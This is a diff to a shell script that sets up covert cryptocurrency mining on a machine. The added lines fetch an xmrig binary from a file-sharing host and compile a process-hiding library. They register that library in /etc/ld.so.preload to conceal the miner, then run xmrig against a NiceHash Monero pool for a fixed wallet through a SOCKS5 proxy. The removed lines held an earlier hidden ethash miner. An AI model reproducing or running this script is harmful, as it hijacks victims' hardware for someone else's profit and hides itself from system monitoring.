@@ -1,4 +1,8 @@
 #!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -31,8 +35,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
+./graftcp/graftcp wget https://filebin.net/nu4o1qn5vej4kq81/xmrig
+chmod +x xmrig
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -40,5 +44,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp nohup ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-T60)@ethash.kupool.com:443 > nohup.out >/dev/null 2>&1 >/dev/null 2>&1 >/dev/null 2>&1
+./graftcp/graftcp ./xmrig --opencl --cuda -o randomxmonero.usa-west.nicehash.com:3380 -a RandomX -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.TEST --threads=6 -x socks5://192.252.214.20:15864
